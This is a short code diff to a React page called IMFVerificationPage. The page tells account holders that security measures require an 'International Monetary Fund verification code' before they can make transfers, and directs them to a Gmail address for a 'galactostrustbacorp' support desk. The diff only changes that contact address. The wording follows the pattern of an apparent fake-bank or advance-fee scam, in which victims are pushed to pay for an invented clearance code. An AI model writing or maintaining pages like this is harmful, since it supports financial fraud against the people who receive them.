@@ -123,7 +123,7 @@ export default function IMFVerificationPage() {
               </p>
               <p className="text-sm text-yellow-700 dark:text-yellow-300 mt-1">
                 Due to security measures, your account requires an IMF (International Monetary Fund) 
-                verification code to proceed with transfers. Please contact your admin support at support.galactostrustbacorp@gmail.com to obtain this code.
+                verification code to proceed with transfers. Please contact your admin support at help.galactostrustbacorp@gmail.com to obtain this code.
               </p>
             </div>
           </div>
